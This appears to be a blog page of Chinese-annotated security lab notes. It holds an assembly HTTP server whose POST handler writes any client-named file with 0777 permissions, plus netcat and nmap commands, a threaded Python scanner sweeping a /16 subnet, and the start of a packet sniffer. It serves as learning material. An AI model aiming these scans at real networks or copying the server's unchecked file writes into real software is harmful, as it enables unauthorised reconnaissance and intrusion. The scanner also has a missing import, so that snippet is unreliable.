class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    # Open socket</span><br><span class="line">    mov rdi, 2</span><br><span class="line">    mov rsi, 1</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 41</span><br><span class="line">    syscall</span><br><span class="line">    # Store socket fd in rbx</span><br><span class="line">    mov rbx, rax</span><br><span class="line"></span><br><span class="line">    # Bind socket to address</span><br><span class="line">    mov rdi, rbx</span><br><span class="line">    lea rsi, sa_family_t</span><br><span class="line">    mov rdx, 16</span><br><span class="line">    mov rax, 49</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # Listen on socket</span><br><span class="line">    mov rdi, rbx</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rax, 50</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    accept_jump:</span><br><span class="line">    # Accept a connection</span><br><span class="line">    mov rdi, rbx# 接受的是open socket 返回的文件描述符，accept在打开的socket上监听链接，接受后返回对应客户端的文件描述符</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 43</span><br><span class="line">    syscall</span><br><span class="line">    # Save new fd for bound connection in r12</span><br><span class="line">    mov r12, rax# 对应客户端的文件描述符</span><br><span class="line"></span><br><span class="line">    # Fork the process and let the child do the serving</span><br><span class="line">    mov rax, 57</span><br><span class="line">    syscall</span><br><span class="line">    cmp rax, 0# 当 fork 返回 0 时表示其为子进程</span><br><span class="line">    je serve_connection</span><br><span class="line">    # Close the connection if parent 父进程关闭客户端的文件描述符，交给子进程与客户端交互</span><br><span class="line">    mov rdi, r12</span><br><span class="line">    mov rax, 3# syscall:close</span><br><span class="line">    syscall</span><br><span class="line">    # Then go back to listening # 继续监听</span><br><span class="line">    jmp accept_jump</span><br><span class="line"></span><br><span class="line">    serve_connection:</span><br><span class="line">    # Close listening socket 子进程不再监听客户端连接</span><br><span class="line">    mov rdi, rbx</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # Read from the connection </span><br><span class="line">    mov rdi, r12</span><br><span class="line">    lea rsi, read_buffer# read_buffer 在 .data 中声明的read_buffer，这里直接保存在对应地址中了</span><br><span class="line">    mov rdx, [read_packet_length] # 长度</span><br><span class="line">    mov rax, 0</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # Figure out what file was requested</span><br><span class="line">    # 返回 file_path的第一个字符的地址</span><br><span class="line">    lea rdi, read_buffer # 第一个参数：将 read_buffer 标签对应的内存地址加载到对应的寄存器中</span><br><span class="line">    mov rsi, 1  # 第二个参数：1</span><br><span class="line">    lea rdx, space # 第三个参数：space的地址</span><br><span class="line">    call get_nth_substr # 返回第 n 次出现的子字符串的最后一个字符的地址</span><br><span class="line">    mov r13, rax # 保存文件地址</span><br><span class="line">    lea rdi, read_buffer</span><br><span class="line">    mov rsi, 2</span><br><span class="line">    call get_nth_substr</span><br><span class="line">    mov r14, rax # </span><br><span class="line">    sub r14, 1 # r14 文件名的最后一个地址</span><br><span class="line">    # r13 = start (exclusive), r14 = end (inclusive)</span><br><span class="line">    mov rdi, r13 # 文件名开始地址 </span><br><span class="line">    mov rsi, r14 # 文件名结束地址</span><br><span class="line">    lea rdx, file_name_buffer # 文件名将要保存到的地址</span><br><span class="line">    call write_to_buf</span><br><span class="line">    # Filename is now stored in file_name_buffer</span><br><span class="line"></span><br><span class="line">    # Check request type </span><br><span class="line">    mov dil, [read_buffer] # read_buffer 的第一个字符判断操作类型</span><br><span class="line">    # Compare to &quot;G&quot;</span><br><span class="line">    cmp dil, 0x47</span><br><span class="line">    # Continue (GET process) if G, otherwise do POST</span><br><span class="line">    jne POST</span><br><span class="line"></span><br><span class="line">    GET:</span><br><span class="line">        # Open that file</span><br><span class="line">        lea rdi, file_name_buffer</span><br><span class="line">        mov rsi, 0</span><br><span class="line">        mov rdx, 0</span><br><span class="line">        mov rax, 2</span><br><span class="line">        syscall</span><br><span class="line">        mov r13, rax # file 的文件描述符</span><br><span class="line"></span><br><span class="line">        # Read file contents</span><br><span class="line">        mov rdi, r13</span><br><span class="line">        lea rsi, file_read_buffer # file content 保存的地方</span><br><span class="line">        mov rdx, 1024</span><br><span class="line">        mov rax, 0</span><br><span class="line">        syscall</span><br><span class="line"></span><br><span class="line">        # Close the file</span><br><span class="line">        mov rdi, r13</span><br><span class="line">        mov rax, 3</span><br><span class="line">        syscall</span><br><span class="line"></span><br><span class="line">        # Write status to connection 向客户端socket发送HTTP状态</span><br><span class="line">        mov rdi, r12 </span><br><span class="line">        lea rsi, write_static # &quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br><span class="line">        mov rdx, 19</span><br><span class="line">        mov rax, 1</span><br><span class="line">        syscall</span><br><span class="line"></span><br><span class="line">        # Write file contents to connection</span><br><span class="line">        lea rdi, file_read_buffer</span><br><span class="line">        call get_len</span><br><span class="line">        mov rdx, rax</span><br><span class="line">        sub rdx, 1</span><br><span class="line">        mov rdi, r12</span><br><span class="line">        lea rsi, file_read_buffer</span><br><span class="line">        mov rax, 1</span><br><span class="line">        syscall</span><br><span class="line"></span><br><span class="line">        jmp exit</span><br><span class="line"></span><br><span class="line">    POST:</span><br><span class="line">        # Open that file</span><br><span class="line">        lea rdi, file_name_buffer</span><br><span class="line">        mov rsi, 0x41 # O_CREAT, O_WRONLY</span><br><span class="line">        mov rdx, 0777</span><br><span class="line">        mov rax, 2</span><br><span class="line">        syscall</span><br><span class="line">        mov r13, rax</span><br><span class="line"></span><br><span class="line">        # Get the POST content</span><br><span class="line">        lea rdi, read_buffer</span><br><span class="line">        mov rsi, 1</span><br><span class="line">        lea rdx, double_cr_lf</span><br><span class="line">        call get_nth_substr</span><br><span class="line">        mov rsi, rax</span><br><span class="line">        add rsi, 1</span><br><span class="line"></span><br><span class="line">        # Get write length</span><br><span class="line">        mov rdi, rsi</span><br><span class="line">        call get_len</span><br><span class="line">        mov rdx, rax</span><br><span class="line">        # Get rid of the pesky null byte</span><br><span class="line">        sub rdx, 1</span><br><span class="line">        # Write to file</span><br><span class="line">        mov rdi, r13</span><br><span class="line">        mov rax, 1</span><br><span class="line">        syscall</span><br><span class="line"></span><br><span class="line">        # Close the file</span><br><span class="line">        mov rdi, r13</span><br><span class="line">        mov rax, 3</span><br><span class="line">        syscall</span><br><span class="line"></span><br><span class="line">        # Write status to connection</span><br><span class="line">        mov rdi, r12</span><br><span class="line">        lea rsi, write_static</span><br><span class="line">        mov rdx, 19</span><br><span class="line">        mov rax, 1</span><br><span class="line">        syscall</span><br><span class="line"></span><br><span class="line">    exit:</span><br><span class="line">    # Close the connection</span><br><span class="line">    mov rdi, r12</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # Sys exit</span><br><span class="line">    mov rdi, 0</span><br><span class="line">    mov rax, 60</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # Get the length of a null-terminated string (including the first null byte)</span><br><span class="line">    # Args:</span><br><span class="line">    # rdi - buffer we&#x27;re checking the length of</span><br><span class="line">    # rax - length</span><br><span class="line">    get_len:</span><br><span class="line">        mov rax, 0</span><br><span class="line">        get_len_loop:</span><br><span class="line">            # See if rdi + rax-th byte is null</span><br><span class="line">            mov r10, rdi</span><br><span class="line">            add r10, rax</span><br><span class="line">            mov r10, [r10]</span><br><span class="line">            add rax, 1</span><br><span class="line">            cmp r10, 0x00</span><br><span class="line">            jne get_len_loop</span><br><span class="line">        ret</span><br><span class="line"></span><br><span class="line">    # Copy the bytes spanning rdi to rsi to the buffer rdx</span><br><span class="line">    # rdx MUST BE LONGER THAN rsi - rdi BYTES, rdi MUST BE LESS THAN rsi</span><br><span class="line">    # Args:</span><br><span class="line">    # rdi - start (exclusive) of the string we&#x27;re copying</span><br><span class="line">    # rsi - end (inclusive) of the string we&#x27;re copying</span><br><span class="line">    # rdx - buffer we&#x27;re copying to</span><br><span class="line">    # rax - unchanged</span><br><span class="line">    write_to_buf:</span><br><span class="line">        write_to_buf_loop:</span><br><span class="line">            add rdi, 1</span><br><span class="line">            mov r9, [rdi]</span><br><span class="line">            mov [rdx], r9</span><br><span class="line">            add rdx, 1</span><br><span class="line">            cmp rdi, rsi</span><br><span class="line">            jne write_to_buf_loop</span><br><span class="line">        mov byte ptr [rdx], 0x00</span><br><span class="line">        ret</span><br><span class="line"></span><br><span class="line">    # Get address of the (last byte of) the nth occurence of substring in string (occurences must be non-overlapping)</span><br><span class="line">    # ONLY GUARANTEED TO WORK ON NULL-TERMINATED STRINGS</span><br><span class="line">    # Args:</span><br><span class="line">    # rdi - target string address</span><br><span class="line">    # rsi - n</span><br><span class="line">    # rdx - substring</span><br><span class="line"></span><br><span class="line">    # rax - address of nth character</span><br><span class="line">    get_nth_substr:</span><br><span class="line">        # Set rcx (ocurrence counter)</span><br><span class="line">        mov rcx, 0</span><br><span class="line">        # Set r10 (to traverse substring)</span><br><span class="line">        mov r10, rdx</span><br><span class="line">        check_character_loop:</span><br><span class="line">            # r9b = character at position</span><br><span class="line">            mov r9b, [rdi]</span><br><span class="line">            # If string&#x27;s terminated, obviously the substring doesn&#x27;t occur enough times</span><br><span class="line">            cmp r9b, 0x00</span><br><span class="line">            je not_enough_occurrences</span><br><span class="line">            # Step through substring iff r9b = current byte</span><br><span class="line">            cmp r9b, byte ptr [r10]</span><br><span class="line">            jne character_not_equal</span><br><span class="line">                add r10, 1</span><br><span class="line">                # If we&#x27;ve reached the end of the substring, increment counter and reset r10</span><br><span class="line">                cmp byte ptr [r10], 0x00</span><br><span class="line">                jne after_comparison</span><br><span class="line">                    mov r10, rdx</span><br><span class="line">                    add rcx, 1</span><br><span class="line">                    jmp after_comparison</span><br><span class="line">            character_not_equal:</span><br><span class="line">                # Reset r10 without adding to count</span><br><span class="line">                mov r10, rdx</span><br><span class="line">            after_comparison:</span><br><span class="line">            # Return address if we&#x27;ve got the nth ocurrence</span><br><span class="line">            cmp rcx, rsi</span><br><span class="line">            je match</span><br><span class="line">            # Otherwise increment and continue</span><br><span class="line">            add rdi, 1</span><br><span class="line">            jmp check_character_loop</span><br><span class="line">        match:</span><br><span class="line">        mov rax, rdi</span><br><span class="line">        ret</span><br><span class="line">        not_enough_occurrences:</span><br><span class="line">        mov rax, -1</span><br><span class="line">        ret</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">    # sockaddr_in struct</span><br><span class="line">    sa_family_t: .word 2</span><br><span class="line">    bind_port: .word 0x5000</span><br><span class="line">    bind_address: .double 0x00000000</span><br><span class="line">    pad: .byte 0,0,0,0,0,0,0,0</span><br><span class="line">    # Make empty buffers to read to</span><br><span class="line">    read_buffer: .space 1024</span><br><span class="line">    file_name_buffer: .space 1024</span><br><span class="line">    file_read_buffer: .space 1024</span><br><span class="line">    # Constants</span><br><span class="line">    # Yes it&#x27;s dumb to use a quad word for this, but it simplifies copying it to the register</span><br><span class="line">    read_packet_length: .quad 0x0000000000000400</span><br><span class="line">    write_static: .string &quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br><span class="line">    space: .string &quot; &quot;</span><br><span class="line">    double_cr_lf: .string &quot;\r\n\r\n&quot;</span><br><span class="line">    </span><br></pre></td></tr></table></figure><h2 id="2-Intercepting-Communication"><a href="#2-Intercepting-Communication" class="headerlink" title="2. Intercepting Communication"></a>2. Intercepting Communication</h2><h3 id="2-1-Connect-to-a-remote-host"><a href="#2-1-Connect-to-a-remote-host" class="headerlink" title="2.1 Connect to a remote host"></a>2.1 Connect to a remote host</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 10.0.0.3 31337</span><br></pre></td></tr></table></figure><h3 id="2-2-Listen-for-a-connection-from-a-remote-host"><a href="#2-2-Listen-for-a-connection-from-a-remote-host" class="headerlink" title="2.2 Listen for a connection from a remote host"></a>2.2 Listen for a connection from a remote host</h3><p><code>-l</code>表示<code>Netcat</code>进入监听状态、<code>-p</code>指定监听的端口号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 31337</span><br></pre></td></tr></table></figure><h3 id="2-3-Find-and-connect-to-a-remote-host"><a href="#2-3-Find-and-connect-to-a-remote-host" class="headerlink" title="2.3 Find and connect to a remote host"></a>2.3 Find and connect to a remote host</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 31337 10.0.0.0/24 <span class="comment"># 使用nmap 扫描对应子网上开放31337端口的IP地址</span></span><br><span class="line">nc 10.0.0.63 31337 <span class="comment"># 建立链接</span></span><br></pre></td></tr></table></figure><h3 id="2-4-Find-and-connect-to-a-remote-host-on-a-large-network"><a href="#2-4-Find-and-connect-to-a-remote-host-on-a-large-network" class="headerlink" title="2.4 Find and connect to a remote host on a large network"></a>2.4 Find and connect to a remote host on a large network</h3><p>由于要寻找的子网数量庞大，使用python的多线程技术进行查找</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line"><span class="comment"># 10.0.0.0/16 子网的起始 IP 和结束 IP</span></span><br><span class="line">start_ip = <span class="string">&#x27;10.0.0.0&#x27;</span></span><br><span class="line">end_ip = <span class="string">&#x27;10.0.255.255&#x27;</span></span><br><span class="line">port = <span class="number">31337</span></span><br><span class="line">num_threads = <span class="number">100</span>  <span class="comment"># 线程数</span></span><br><span class="line">output_file = <span class="string">&#x27;found_hosts.txt&#x27;</span>  <span class="comment"># 输出文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 IP 地址转换为整数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ip_to_int</span>(<span class="params">ip</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;:02x&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>(x)) <span class="keyword">for</span> x <span class="keyword">in</span> ip.split(<span class="string">&#x27;.&#x27;</span>)]), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将整数转换为 IP 地址</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">int_to_ip</span>(<span class="params">ip_int</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span>.join([<span class="built_in">str</span>(ip_int &gt;&gt; (i * <span class="number">8</span>) &amp; <span class="number">0xFF</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)[::-<span class="number">1</span>]])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 扫描指定 IP 地址的指定端口</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan_ip</span>(<span class="params">ip</span>):</span><br><span class="line">    <span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="keyword">as</span> s:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;checking <span class="subst">&#123;ip&#125;</span>&quot;</span>)</span><br><span class="line">        s.settimeout(<span class="number">0.5</span>)</span><br><span class="line">        result = s.connect_ex((ip, port))</span><br><span class="line">        <span class="keyword">if</span> result == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;Found host: <span class="subst">&#123;ip&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(<span class="string">f&#x27;<span class="subst">&#123;ip&#125;</span>\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> ip</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取起始和结束 IP 的整数值</span></span><br><span class="line">start_int = ip_to_int(start_ip)</span><br><span class="line">end_int = ip_to_int(end_ip)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建线程池并行扫描</span></span><br><span class="line"><span class="keyword">with</span> ThreadPoolExecutor(max_workers=num_threads) <span class="keyword">as</span> executor:</span><br><span class="line">    future_to_ip = &#123;executor.submit(scan_ip, int_to_ip(ip_int)): int_to_ip(ip_int) <span class="keyword">for</span> ip_int <span class="keyword">in</span> <span class="built_in">range</span>(start_int, end_int + <span class="number">1</span>)&#125;</span><br><span class="line">    <span class="keyword">for</span> future <span class="keyword">in</span> concurrent.futures.as_completed(future_to_ip):</span><br><span class="line">        ip = future_to_ip[future]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result = future.result()</span><br><span class="line">            <span class="keyword">if</span> result:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;Successfully connected to <span class="subst">&#123;result&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> exc:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;ip&#125;</span> generated an exception: <span class="subst">&#123;exc&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-5-Monitor-traffic-from-a-remote-host"><a href="#2-5-Monitor-traffic-from-a-remote-host" class="headerlink" title="2.5 Monitor traffic from a remote host"></a>2.5 Monitor traffic from a remote host</h3><blockquote><p>IPV4头格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0                   1                   2                   3</span><br><span class="line">0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|Version|  IHL  |Type of Service|          Total Length         |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|         Identification        |Flags|      Fragment Offset    |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|  Time to Live |    Protocol   |         Header Checksum       |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                       Source Address                          |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                    Destination Address                        |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure></blockquote><p>在端口上捕获TCP数据包</p><ul><li><p><code>!BBHHHBBH4s4s</code> 是用于解析二进制数据的格式字符串，它是 Python 的 <code>struct</code> 模块的一部分。</p><ul><li><p><code>!</code>：表示使用网络字节顺序（大端序）。</p></li><li><p><code>B</code>：表示一个无符号的 8 位整数（1 字节）。</p></li><li><p><code>H</code>：表示一个无符号的 16 位整数（2 字节）。</p></li><li><p><code>4s</code>：表示一个长度为 4 的字节串。</p></li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_ip_header</span>(<span class="params">data</span>):</span><br><span class="line">    ip_header = struct.unpack(<span class="string">&#x27;!BBHHHBBH4s4s&#x27;</span>, data[:<span class="number">20</span>])</span><br><span class="line">    version_ihl = ip_header[<span class="number">0</span>]</span><br><span class="line">    version = version_ihl &gt;&gt; <span class="number">4</span></span><br><span class="line">    ihl = version_ihl &amp; <span class="number">0xF</span></span><br><span class="line">    tos = ip_header[<span class="number">1</span>]</span><br><span class="line">    total_length = ip_header[<span class="number">2</span>]</span><br><span class="line">    identification = ip_header[<span class="number">3</span>]</span><br><span class="line">    flags_offset = ip_header[<span class="number">4</span>]</span><br><span class="line">    ttl = ip_header[<span class="number">5</span>]</span><br><span class="line">    protocol = ip_header[<span class="number">6</span>]</span><br><span class="line">    checksum = ip_header[<span class="number">7</span>]</span><br><span class="line">    src_ip = socket.inet_ntoa(ip_header[<span class="number">8</span>])</span><br><span class="line">    dst_ip = socket.inet_ntoa(ip_header[<span class="number">9</span>])</span><br><span class="line"></span><br><span class="line">    ip_header_info = &#123;</span><br><span class="line">        <span class="string">&#x27;Version&#x27;</span>: version,</span><br><span class="line">        <span class="string">&#x27;Header Length&#x27;</span>: ihl * <span class="number">4</span>,</span><br><span class="line">        <span class="string">&#x27;Type of 